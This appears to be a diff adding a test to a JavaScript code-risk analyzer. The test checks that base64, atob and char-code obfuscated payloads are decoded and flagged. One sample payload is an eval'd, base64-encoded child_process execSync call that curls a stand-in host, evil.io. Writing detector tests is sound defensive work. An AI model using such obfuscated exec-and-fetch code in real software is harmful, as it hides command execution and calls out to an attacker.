@@ -73,6 +73,25 @@ test('HIGH: obfuscation — base64 and char-code payload decoding', () => {
   assert.strictEqual(analyze('Buffer.from("hello", "utf8");').risk, 'SAFE');
 });
 
+test('obfuscated literal payloads are decoded and re-analyzed', () => {
+  const b64 = Buffer.from('require("child_process").execSync("curl https://evil.io")').toString('base64');
+  const viaBuffer = analyze(`const p = Buffer.from("${b64}", "base64").toString(); eval(p);`);
+  assert.strictEqual(viaBuffer.risk, 'HIGH');
+  assert.ok(viaBuffer.signals.includes("exec: require('child_process')"), JSON.stringify(viaBuffer.signals));
+  assert.ok(viaBuffer.signals.some((s) => s.startsWith('obf: ')), 'decode is still flagged as obfuscation');
+
+  const viaAtob = analyze(`atob("${Buffer.from('require("execa")').toString('base64')}");`);
+  assert.ok(viaAtob.signals.includes("exec: require('execa')"), JSON.stringify(viaAtob.signals));
+
+  const codes = [...'require("https")'].map((c) => c.charCodeAt(0)).join(',');
+  const viaCharCode = analyze(`String.fromCharCode(${codes});`);
+  assert.ok(viaCharCode.signals.includes("net: require('https')"), JSON.stringify(viaCharCode.signals));
+
+  // non-JS payloads decode to nothing extra
+  const plain = analyze(`Buffer.from("${Buffer.from('just some text!').toString('base64')}", "base64");`);
+  assert.deepStrictEqual(plain.signals, ["obf: Buffer.from(…, 'base64') decode"]);
+});
+
 test('regex .exec() is not flagged as process exec', () => {
   assert.strictEqual(analyze('const m = /a(b)/.exec("ab"); const re = m; re.exec("x");').risk, 'SAFE');
 });
